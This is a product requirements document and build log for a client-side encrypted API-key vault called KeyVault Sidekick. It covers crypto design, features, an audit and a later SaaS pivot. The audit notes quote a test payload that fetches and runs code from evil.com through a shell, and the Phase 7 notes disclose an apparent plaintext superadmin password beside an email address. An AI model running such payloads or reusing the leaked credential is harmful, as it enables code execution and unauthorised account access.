# Product Requirements Document
## KeyVault Sidekick
### By VibeProSoft

**Version:** 1.0 — MVP  
**Status:** Draft  
**Owner:** Rob / VibeProSoft  
**Date:** June 2026

---

## 1. Problem Statement

Vibe coders juggle a sprawling set of API keys, secrets, and generated values across multiple SaaS projects. The current reality:

- Keys get pasted into chat, hardcoded into files, or scattered across sticky notes and `.env` files with no structure.
- There's no quick way to generate secure values (JWT secrets, UUIDs, random strings) without googling a tool.
- Exporting keys to Claude Code or `.env` files is manual and error-prone.
- Trust in cloud-based secret managers is a barrier — many devs don't want their keys on someone else's server.

**KeyVault Sidekick** solves this by providing a browser-only, client-side encrypted vault purpose-built for solo vibe coders. No backend. No breach surface. Keys never leave the device.

---

## 2. Target User

**Primary:** Solo vibe coders building SaaS products (Claude Code users, Cloudflare stack, indie hackers)

**Profile:**
- Managing 3–10 active projects simultaneously
- Using tools like Cloudflare Workers, Stripe, Resend, Clerk, Supabase, etc.
- Working on Windows/Mac/WSL with Claude Code as primary dev tool
- Values simplicity, speed, and trust — deeply skeptical of "sign up to store your secrets"

**Not targeting (MVP):** Teams, CI/CD pipelines, enterprise secrets management

---

## 3. Core Value Propositions

1. **Zero backend.** Encrypted in the browser using the Web Crypto API. Nothing is transmitted anywhere.
2. **Project-organized.** One vault per SaaS project — not one giant flat list.
3. **Built-in generator.** Generate JWT secrets, UUIDs, API key patterns, random hex strings, bcrypt salts, and base64 tokens without leaving the app.
4. **Claude Code export.** One-click export to `.env`, `settings.json`, or `.envrc` format, ready to paste.
5. **Instant.** No login, no sync, no waiting. Open and use.

---

## 4. Feature Scope — MVP

### 4.1 Vault (Core Storage)

| Feature | Description |
|---|---|
| Master password | AES-256-GCM encryption, PBKDF2 key derivation. Password never stored. |
| Lock/unlock | Vault locks after configurable idle timeout (default: 15 min). |
| Local persistence | Encrypted blob stored in `localStorage`. Export/import as `.vault` file for backup. |
| No account required | Zero sign-up, zero email, zero server. |

### 4.2 Projects

| Feature | Description |
|---|---|
| Project creation | Name + optional description + color tag. |
| Project vault | Each project holds its own set of keys/secrets. |
| Project archive | Soft-archive completed/inactive projects. |
| Delete project | Hard delete with confirmation. |

### 4.3 Key/Secret Management

| Feature | Description |
|---|---|
| Add key | Name, value, type tag (API Key / Secret / Token / OAuth / Webhook / Other), optional notes. |
| Edit / delete | Standard CRUD. |
| Copy to clipboard | One-click copy. Auto-clears clipboard after 30 seconds (configurable). |
| Show/hide value | Hidden by default. Click to reveal. |
| Search | Filter keys across all projects by name or tag. |
| Bulk import | Paste a `.env` file to import all key/value pairs into a project. |

### 4.4 Generator

| Generator | Output |
|---|---|
| JWT Secret | 256-bit or 512-bit random hex string |
| UUID v4 | Standard UUID |
| Random hex | Configurable byte length (16 / 32 / 64 bytes) |
| Random base64 | URL-safe, configurable length |
| API key pattern | `sk-` prefix + 40 random alphanumeric chars (configurable) |
| Bcrypt salt rounds | Numeric value selector (8–14) with strength label |
| Password | Configurable length, charset options |

Generated values can be saved directly to a project key with one click.

### 4.5 Claude Code Export

| Export Format | Description |
|---|---|
| `.env` | Standard `KEY=value` format for all selected keys |
| `.envrc` (direnv) | `export KEY=value` format |
| `settings.json env block` | Claude Code's `{ "env": { ... } }` format |
| Clipboard | Copies formatted output |
| Download | Saves as file |

Export is scoped per-project. User selects which keys to include.

### 4.6 Security

| Feature | Description |
|---|---|
| AES-256-GCM encryption | Industry standard. Keys encrypted at rest in localStorage. |
| PBKDF2 key derivation | 310,000 iterations (OWASP 2024 recommendation), SHA-256. |
| Auto-lock | Idle timeout. Lock on browser tab close (optional toggle). |
| Clipboard clearing | Auto-clear clipboard 30s after copy. |
| No telemetry | Zero analytics, zero tracking, zero external requests. |
| CSP | Strict Content Security Policy, no external resource loading. |

---

## 5. Feature Scope — Post-MVP (Backlog)

- **1Password CLI bridge** — `apiKeyHelper` script generator that pulls from 1Password
- **Doppler sync** — pull project secrets from Doppler into the vault
- **Vault sync via Cloudflare KV** — optional encrypted remote backup (bring your own CF account)
- **Key rotation reminders** — flag keys older than N days
- **Audit log** — local log of copy/export events
- **Browser extension** — auto-fill keys into web UIs (Cloudflare dashboard, Stripe, etc.)
- **QR export** — scan vault backup on another device

---

## 6. Technical Architecture

### Stack
- **Framework:** Vanilla HTML/CSS/JS or React (single `.html` file for MVP — zero build tooling)
- **Crypto:** Web Crypto API (native browser, no library dependency)
- **Storage:** `localStorage` (encrypted blob)
- **Hosting:** Static — Cloudflare Pages (free tier)
- **No backend. No database. No auth service.**

### Encryption Design
```
Master Password
    ↓ PBKDF2 (310k iterations, SHA-256, random 16-byte salt)
Derived Key (AES-256-GCM)
    ↓ encrypt
Ciphertext + IV + Salt → stored as JSON blob in localStorage
```

Salt and IV are unique per save operation. The master password is never stored or transmitted.

### Data Model (in-memory, encrypted at rest)
```json
{
  "version": 1,
  "projects": [
    {
      "id": "uuid",
      "name": "ITIL Sidekick",
      "color": "#1D9E75",
      "keys": [
        {
          "id": "uuid",
          "name": "CLOUDFLARE_API_TOKEN",
          "value": "...",
          "type": "api_key",
          "notes": "Scoped to itilsidekick.com zone only",
          "createdAt": "ISO8601",
          "updatedAt": "ISO8601"
        }
      ]
    }
  ]
}
```

---

## 7. UX/UI Direction

- **Aesthetic:** Dark, utilitarian, security-forward. Feels like a dev tool, not a consumer app.
- **Density:** Compact. Power users want information density, not marketing whitespace.
- **Tone:** Direct. No marketing language in the UI. Labels are terse and precise.
- **Color:** Dark background, monospace accents, a single brand accent color (teal or amber).
- **Animations:** Minimal — lock/unlock transition, copy confirmation flash.
- **Responsive:** Desktop-first. Mobile is nice-to-have, not MVP.

---

## 8. Screens / Views

1. **Unlock screen** — master password entry, vault setup on first launch
2. **Project list** — all projects with key count and last-updated timestamp
3. **Project detail** — list of keys for a project, search/filter, add key
4. **Key detail / edit** — name, value (hidden), type, notes
5. **Generator** — tabbed by generator type, output + save-to-project action
6. **Export** — project selector, key selector, format picker, copy/download
7. **Settings** — idle timeout, clipboard clear delay, vault backup/restore, change master password

---

## 9. Success Metrics (MVP)

| Metric | Target |
|---|---|
| Time from open to first copied key | < 10 seconds |
| Time to generate + save a JWT secret | < 30 seconds |
| Time to export a project's `.env` | < 20 seconds |
| Vault size supported | Up to 50 projects, 500 keys |
| Zero reported data leaks | Table stakes |

---

## 10. Build Plan

### Phase 1 — Foundation (Week 1) — SHIPPED 2026-06-07
- [x] Crypto module: encrypt / decrypt / derive key / PBKDF2
- [x] Storage module: save / load / wipe encrypted blob
- [x] Unlock screen + first-run setup
- [x] Data model + in-memory state management
- [x] **Phase 1.1 hardening (post-review, shipped 2026-06-07):**
  - Unicode NFC normalization of master password (prevents cross-OS lockout from NFD/NFC drift)
  - Whitespace-only / empty passwords rejected on create (prevents accidental-paste lockout)
  - KDF iterations + hash + cipher algorithm read FROM the stored blob, not hardcoded — future param bumps no longer silently break existing vaults
  - State mutations only AFTER persist succeeds in both first-run and unlock paths (no more in-memory-unlocked-but-no-disk-copy)
  - Outer blob and decrypted vault validated against schema at the decrypt boundary
  - Decrypt errors classified: `OperationError` → "Incorrect master password"; anything else → "Vault data is corrupt: ..." (was: every error reported as wrong password)
  - `JSON.parse` of plaintext wrapped in try/catch
  - `localStorage.setItem` wrapped — QuotaExceededError surfaces as friendly message
  - Form double-submit guard: inFlight flag + inputs disabled during work
  - Status chip hidden on first-run-create screen (was misleadingly showing "Locked" with no vault present)
  - Wipe requires typing `WIPE` instead of single OK click
  - Password inputs use `autocomplete="off"` to avoid browser password-manager cloud sync
  - Error messages use `role="alert"` + `aria-live="polite"` for screen readers
  - CSP tightened: `object-src 'none'`, `worker-src 'none'`, `child-src 'none'`
  - `window.storage` event listener: external wipe/edit in another tab locks this tab (partial multi-tab safety; full conflict resolution deferred to Phase 2)
- Accepted Phase-1 tradeoffs (revisit at Phase 5 if moving to a Vite build):
  - CSP `'unsafe-inline'` for scripts/styles — required by single-HTML-file MVP per §6, §12
  - Master password retained in DOM input + JS string heap until GC — JS string immutability limit

### Phase 2 — Core Vault (Week 2) — SHIPPED 2026-06-07
- [x] Project CRUD (name + description + color picker + archive/unarchive + hard delete with confirm)
- [x] Key CRUD (name + value + type chip + notes; show/hide, copy, edit, delete)
- [x] Search/filter (project list searches projects by name/description + matching keys shown inline; project detail filters keys by name/type/notes)
- [x] `.env` bulk import (comment skip, quote strip, `export ` prefix strip, invalid name reject, duplicate-name auto-suffix `_2`/`_3`, preview before commit)
- [x] **Phase 2 architecture: `mutate()` helper** — every CRUD goes through deep-clone → mutate draft → persist → commit-on-success, fixing the C23 altitude finding while only one caller per op exists (in-memory and disk never diverge)
- [x] Modal system (focus trap, Escape to close, click-backdrop to close, return focus to trigger)
- [x] Toast notifications for copy/save/delete
- [x] Navigation: `currentView` state ('projects' | 'project') + `navigate(view, id)` (addresses C24 altitude finding)
- Deferred to Phase 4 per build plan: clipboard auto-clear after 30s, auto-lock idle timer

### Phase 3 — Generator (Week 3) — SHIPPED 2026-06-07
- [x] All 7 generator types:
  - **JWT secret** — 256-bit / 512-bit pill selector → hex
  - **UUID v4** — `crypto.randomUUID()`
  - **Random hex** — 16 / 32 / 64 byte pill selector
  - **Random base64** — URL-safe (RFC 4648 §5), no padding, configurable byte length 8-256
  - **API key pattern** — configurable prefix + alphanumeric body, length 8-128
  - **Bcrypt rounds** — 8-14 with live strength label (Weak / OK / Strong / Paranoid)
  - **Password** — configurable length + charset toggles (lowercase, uppercase, digits, symbols)
- [x] Save-to-project flow — modal with project selector (excludes archived) + key name (default per generator) + type (default per generator) + notes + value preview; when no projects exist, prompts to create one first
- [x] Topnav: PROJECTS | GENERATOR switcher in the topbar (shown only when unlocked)
- [x] Modulo-bias-free RNG: rejection sampling on the random byte buffer (256 / setLen × setLen cutoff)
- [x] Generator UI state persists per session (selected tab, last options, last output) — tab-switch preserves prior tab's output if any
- [x] Copy button on generated output for clipboard-only flow

### Phase 4 — Export + Polish (Week 4) — SHIPPED 2026-06-08
- [x] Export screen: project selector + key checkboxes (select/deselect all) + format picker (.env / .envrc / settings.json) + real-time output preview + Copy to clipboard + Download file (Blob URL, no CSP change needed)
- [x] Auto-lock idle timer: configurable via Settings (5/10/15/30/60 min / Never); throttled activity listeners (click, keydown, mousemove, touchstart, once per 5s); `resetIdleTimer()` on unlock + activity; `stopIdleTimer()` on lock; `pendingNotice` banner on auto-lock
- [x] Clipboard auto-clear: configurable via Settings (15s/30s/60s/Never); reads clipboard to compare before clearing (fails silently if permission denied)
- [x] Settings screen (⚙ gear icon in topbar, not in topnav): Security section (idle timeout + clipboard clear selects, saved to `keyvault_sidekick_settings` in localStorage); Master Password section (change password modal); Vault Backup section (export .vault + import .vault with confirm); Danger Zone (wipe vault)
- [x] `.vault` file export: downloads `keyvault-backup-YYYY-MM-DD.vault` (raw encrypted blob JSON, datestamped)
- [x] `.vault` file import: reads file → validates outer blob schema → writes to localStorage → locks vault with notice to re-unlock with backup's master password
- [x] Change master password: re-derives key with new password + fresh salt, re-encrypts vault, updates in-memory state, continues unlocked — verified wrong-pw rejection + correct-pw round-trip
- [x] **URL fragment prefill hook (Claude Code integration)** — SHIPPED 2026-06-08
  - URL format: `http://localhost:8091/#action=prefill&name=CLOUDFLARE_API_TOKEN&value=cf_token_xxx&type=api_key&project=MyProject&notes=Created+by+Claude`
  - On load + `hashchange`: fragment detected → `action=prefill` stripped → rest stored in `sessionStorage['kvs_prefill']` → hash cleared via `history.replaceState` immediately
  - If vault unlocked when hash fires: `checkPrefill()` called immediately (100ms delay)
  - If vault locked when hash fires: `checkPrefill()` called after `handleUnlock()` / `handleFirstRun()` (200ms delay)
  - "Save key from Claude" modal: ⚡ banner + project selector (fuzzy-matches `project` hint by id → exact name → partial name → first project) + pre-filled name/type/notes + value preview; Skip or Save
  - Security: URL fragment not sent to HTTP server; value lives in sessionStorage only until modal confirm/skip; sessionStorage cleared on first read
  - Verified end-to-end: hash stripped → unlock → modal auto-opens with correct name/type/notes/project → key saved to vault → `totalKeys` incremented

### Phase 7.6 — Account settings + change password (v2.0.2) — SHIPPED 2026-06-08
Closes the Phase 7 polish gap: signed-in users can now change their own login password.
- **New endpoint**: POST /api/auth/change-password — verifies current pw, enforces strength, re-encrypts, bumps session_version, re-issues caller a fresh cookie, rate-limited, CSRF-checked, audit-logged
- **Session versioning** (migration 0003): `session_version` column on users + `sv` claim in session cookie payload + middleware compares JWT sv to DB and rejects stale tokens. Backwards-compatible: missing sv treated as 0.
- **New page**: `/account.html` — account info card + change-password form with live 4-bar strength meter + live requirements checklist + warning about other-device sign-out
- **Linked from**: vault topbar (user pill is now a link), admin topbar (Account button)
- End-to-end verified: change pw from device 1 → device 2 immediately gets "Not authenticated" on next request; audit log captures `password_changed` with `session_version: 1`.

### Phase 7.5 — Abuse protection (v2.0.1) — SHIPPED 2026-06-08
Clarification from user: the reason for user management was specifically to enable abuse controls. User mgmt alone gates WHO can access — this layer adds rate limits, lockout, audit, CSRF, password strength.
- **Rate limiting** via `[[rate_limiting]]` Pages bindings: LOGIN_LIMITER (5/60s/IP), INVITE_LIMITER (10/60s/IP), ADMIN_LIMITER (30/10s/session). All return 429 on exceedance.
- **Account lockout** (D1-backed, hourly window): 5 failed logins in 1 hour → account locked for 1 hour. `failed_logins` + `locked_accounts` tables. Successful login clears counter. Lockout indicator in admin panel.
- **Audit log** (migration 0002): `audit_log` table records every action (login_success/failure/locked, logout, user_*, invitation_*) with IP + UA + JSON details. GET /api/admin/audit-log endpoint with action/email/ip filters. Admin panel viewer with live refresh.
- **CSRF**: Origin header check on every POST/PATCH/DELETE. SameSite=Lax cookie + Origin check = defense-in-depth.
- **Password strength**: ≥8 chars, ≥3 of 4 character classes (lower/upper/digit/symbol), reject 24 common weak passwords. Applied to admin user creation + invite acceptance.
- End-to-end verified: success+lockout+CSRF block+audit recording+weak-pw rejection all work as expected.

### Phase 7 — Multi-tenant + landing page (v2.0.0) — SHIPPED 2026-06-08
**Major architecture pivot.** From zero-backend single-file vault → invitation-only SaaS with auth gate. The vault's local-only encryption properties are preserved; the new auth layer only controls who can OPEN the app at all. Vault content STILL never touches the server.
- Repo restructured: `public/` (static), `functions/` (Pages Functions), `migrations/`, `scripts/`, `docs/`
- D1 database `keyvault-sidekick-db` (id `4cbb409d-4356-4007-b62f-58493498b279`) with `users` + `invitations` tables
- Auth: email+password, PBKDF2 100k (CF Workers cap — vault crypto in app.html stays 310k browser-side), HMAC-SHA-256 session cookie, 30-day TTL, HttpOnly/Secure/SameSite=Lax
- Invitation tokens: 32 random bytes (base64url); only SHA-256(token) stored in D1; 7-day TTL; one-time-use; admin copies one-time URL and sends out-of-band (no email service yet)
- Generic "Invalid email or password" on login to prevent enumeration
- Superadmin bootstrapped via `scripts/create-superadmin.mjs`; rob.lauzon@vibeprosoft.com is the first superadmin (initial pw `rMui4aCet0uk7ibj` — CHANGE ON FIRST LOGIN)
- New static pages: `public/index.html` (marketing landing with hero / how-it-works / security model / use cases / CTA), `public/login.html`, `public/invite.html`, `public/admin.html`
- New API routes: `/api/auth/{login,logout,me,accept-invite}`, `/api/auth/invite/[token]`, `/api/admin/users` (GET/POST), `/api/admin/users/[id]` (DELETE/PATCH), `/api/admin/invitations` (GET/POST), `/api/admin/invitations/[id]` (DELETE)
- Vault adapted: CSP loosened from `connect-src 'none'` → `connect-src 'self'` (auth API only — vault content NEVER goes through any fetch); fragment captured BEFORE auth redirect so Claude Code prefill URL survives the round-trip through /login.html
- End-to-end verified: login → me → admin users → admin invitations → accept-invite → new user signs in. All gated routes return 401/403 correctly without auth.

### Phase 6.1 — Vibe-code audit remediation (v1.5.2) — SHIPPED 2026-06-08
Ran `/vibe-code-audit` against the v1.5.1 codebase. No critical/high findings. Two medium + three hygiene fixes applied as v1.5.2:
- **VC-SEC-01 Medium — Iteration drift in `encryptAndSave`** — `VaultState` now tracks `kdfIterations`; `unlock()` + `encryptAndSave()` take iterations explicitly; `mutate()` passes through; future PBKDF2 bumps will no longer silently corrupt existing vaults
- **VC-SEC-06 Medium — Shell injection in `.env` / `.envrc` export** — added `shellQuote()` with POSIX close-escape-reopen pattern; `$()`, backticks, embedded quotes now safe to source
- **VC-SEC-02 Low — Prefill banner tone** — explicit warning about link-click attack vector
- **VC-SEC-05 Info — Settings prototype-pollution surface** — explicit field whitelist replaces `Object.assign` of arbitrary JSON
- **VC-SEC-05 Low — `.gitignore`** — added `Test Files/`, `*.vault`, `keyvault-sidekick.html`, `keyvault-backup-*.html`
- File hash: `ac3962b87511304583fdb949e3a7d80fc77142167cfe34ba0d244ec9e8dbc242`
- All fixes verified end-to-end in browser (synthetic 250k blob unlock-mutate-relock-unlock proves no lockout; `$(curl evil.com|sh)` exports as literal-quoted)
- Audit verdict: **Go — Proceed to production**

### Phase 6 — Integrity verification + offline-first polish (Week 6) — SHIPPED 2026-06-08
- [x] SHA-256 hash of loaded HTML computed at script start via `document.documentElement.outerHTML` + `crypto.subtle.digest` (CSP-safe — no fetch)
- [x] App footer with truncated hash (first 12 chars + ellipsis) + full hash in tooltip + "Verify ↗" link that opens Guide → Integrity section
- [x] Guide → Integrity section: full SHA-256 + Copy hash button + threat-model explanation (CDN compromise scenario)
- [x] "Save offline copy" button — downloads exact `__initialHTML` captured at script boot; opens correctly via `text/html;charset=utf-8` MIME
- [x] 4-step Run-Locally guide: Save offline → Open from `file://` → OS-level hash verification (`certutil` Win / `shasum -a 256` macOS+Linux) → git clone fallback
- [x] Warn callout in Guide explaining outerHTML serialization vs raw source byte-for-byte
- [x] `downloadText` upgraded with extension-based MIME detection (`html` / `json` / `vault` / fallback `text/plain`)
- [x] GitHub release v1.5.0 published with BOTH hashes:
  - File hash (raw `index.html`): `00ae0ac412960ca66365cb50c50d787e5a0c83981a0019e0ac47a061719eb1ee`
  - Runtime hash (browser-parsed outerHTML): `e98670b2a38a3116715a0e3da70aa75c366d76d96a1dcd144c019e904fe76cc9`
- [x] README updated with Threat model table, Verifying integrity walkthrough, Running locally section
- [x] Deployed to CF Pages — verified that CF serves the file byte-for-byte (deployed file hash = local file hash)
- Closed the single remaining attack vector vs desktop apps: supply-chain on the hosted HTML

### Phase 5 — Shipping (Week 5) — SHIPPED 2026-06-08
- [x] GitHub repo at https://github.com/boblauzon/keyvault-sidekick (private; 4 files: index.html + README.md + PRD + .gitignore; commit `ee0505c`)
- [x] README.md — stack overview, run locally, Claude Code MCP prefill integration guide (URL format, params table, security model, end-to-end example), build plan status table
- [x] Cloudflare Pages deploy — `keyvault-sidekick` project, branch `main`, live at https://keyvault-sidekick.pages.dev (200 OK verified from CF edge; 4 assets uploaded)
- [ ] Landing page — deferred; will use VibeProSoft Hub catalog entry

---

## 11. Risks & Mitigations

| Risk | Mitigation |
|---|---|
| User forgets master password → locked out forever | Warn prominently during setup; encourage `.vault` file backup |
| localStorage cleared by browser (private mode, storage settings) | Warning banner in private/incognito mode; prompt to export `.vault` backup |
| Single-file HTML gets large | Keep MVP lean; if >500 lines, move to a minimal Vite build |
| Crypto API availability | Web Crypto is supported in all modern browsers; add a check on load |

---

## 12. Open Questions

1. **Name final?** "KeyVault Sidekick" fits the VibeProSoft brand. Alternatives: `VaultSidekick`, `SecretSidekick`, `KeyKit`.
2. **Single `.html` or build?** Single file is fastest to ship and easiest to audit. Recommend single file for MVP, revisit at Phase 5.
3. **Cloudflare Pages domain:** Subdomain of `vibeprosoft.com` or standalone domain?

---

*End of PRD v1.0*
